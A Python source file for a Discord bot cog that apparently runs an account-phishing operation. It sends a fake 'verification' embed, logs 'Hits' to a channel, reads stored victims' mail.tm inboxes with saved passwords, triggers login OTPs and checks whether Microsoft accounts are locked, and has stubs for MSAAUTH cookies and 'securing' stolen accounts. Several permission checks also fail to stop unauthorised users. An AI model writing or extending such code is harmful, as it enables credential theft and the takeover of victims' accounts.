import discord
import httpx
import json

from discord import app_commands
from discord.ext import commands

from database.database import DBConnection

from views.buttons.button_refresh import ButtonRefresh
from views.modals.modal_three import MyModalThree

from views.utils.checkLocked import checkLocked
from views.utils.sendAuth import sendAuth
from cogs.utils.fetchEmails import fetchEmails

owners = json.load(open("config.json", "r+"))["owners"]

class MyCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="send_embed", description="Sends the verification embed")
    async def verificationEmbed(self, interaction: discord.Interaction):
        if interaction.user.id not in owners:
            await interaction.response.send_message(
                "You do not have permission to execute this command!", 
                ephemeral=True
            )
            return

        config = json.load(open("config.json", "r+"))
        
        if not config["discord"]["logs_channel"] or not config["discord"]["accounts_channel"]:
            await interaction.response.send_message(
                "You must set the Logs and Hits channel first with /set_channel!", 
                ephemeral = True 
            )
            return
        
        await interaction.response.send_modal(MyModalThree())
        await interaction.channel.send(
            "Embed sent!",
            ephemeral = True
        )

    @app_commands.command(name="set_channel", description="Sets your channel IDs")
    @app_commands.choices(
        choice=[
            app_commands.Choice(name="Logs", value="logs_channel"),
            app_commands.Choice(name="Hits", value="accounts_channel"),
        ]
    )
    async def setChannels(self, interaction: discord.Interaction, choice: app_commands.Choice[str]):
        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        with open("config.json", "r+") as config:

            newConfig = json.load(config)

            match choice.value:
                case "logs_channel":
                    newConfig["discord"]["logs_channel"] = int(interaction.channel_id)
                case "accounts_channel":
                    newConfig["discord"]["accounts_channel"] = int(interaction.channel_id)

            config.seek(0)
            json.dump(newConfig, config, indent=4)

        await interaction.response.send_message(f"Sucessfully set {choice.name} channel!", ephemeral=True)

    @app_commands.command(name="secure", description="Automaticly secures your account")
    @app_commands.choices(
        type=[
            app_commands.Choice(name="Recovery Code", value="recv_code"),
            app_commands.Choice(name="MSAAUTH", value="msaauth_cookie"),
        ]
    )
    async def secure(self, interaction: discord.Interaction, type: app_commands.Choice[str]):

        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        await interaction.response.send_message(f"**This command is still in progress.**", ephemeral=True)

    @app_commands.command(name="accounts", description="Shows you all stored accounts")
    async def accounts(self, interaction: discord.Interaction):

        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        await interaction.response.send_message(f"**This command is still in progress.**", ephemeral=True)

    # /email and /check_locked will be changed from parameter to modal in the future to handle bulk requests
    @app_commands.command(name="email", description="Shows the inbox of your email")
    async def email(self, interaction: discord.Interaction, email: str):

        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        with DBConnection() as db:
            password = db.getEmailPassword(email)

            if not password:
                await interaction.response.send_message("This email has not been found.", ephemeral=True)
        
        
        async with httpx.AsyncClient() as session:

            data = await session.post(  
                url = "https://api.mail.tm/token",
                headers = {
                    "Accept": "application/json",
                    "Content-Type": "application/json"
                },
                json = {
                    "address": email,
                    "password": password[0]
                }
            )

            token = data.json()["token"]
        
        getEmails = await fetchEmails(token, email, password[0])

        if getEmails:
            interaction = await interaction.response.send_message(
                embed = getEmails,
                view = ButtonRefresh(token, email, password[0], interaction),
                ephemeral=True
            )
            return
        
        await interaction.response.send_message("This email has not been found.", ephemeral=True)

    @app_commands.command(name="requestotp", description="Attempts to send an email OTP")
    async def requestotp(self, interaction: discord.Interaction, email: str):

        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        response = await sendAuth(email)
        
        # OTP Cooldown, Auth app, No Sec Email is not being handled in the responses
        if "OtcLoginEligibleProofs" in response["Credentials"]:

            for value in response["Credentials"]["OtcLoginEligibleProofs"]:
                if value["otcSent"]:
                    await interaction.response.send_message(f"Sucessfully sent OTP to `{value["display"]}`", ephemeral=True)
                    return
            
        await interaction.response.send_message(f"Failed to sent OTP to this email...", ephemeral=True)


    @app_commands.command(name="check_locked", description="Attempts to check if an email is locked")
    async def checkLocked(self, interaction: discord.Interaction, email: str):

        if interaction.user.id not in owners:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)

        await interaction.response.defer()

        lockedInfo = await checkLocked(email)
        
        # Failed
        if lockedInfo:
            # Not Found
            if lockedInfo["StatusCode"] != 500:
                # Suspended
                if "Value" not in lockedInfo or json.loads(lockedInfo["Value"])["status"]["isAccountSuspended"]:
                    await interaction.response.send_message(f"This email is **locked**", ephemeral=True)
                    return
                else:
                    await interaction.response.send_message(f"This email is **not** locked", ephemeral=True)
                    return

        await interaction.response.send_message(f"Failed to check if this email is locked", ephemeral=True)

async def setup(bot):
    await bot.add_cog(MyCog(bot))
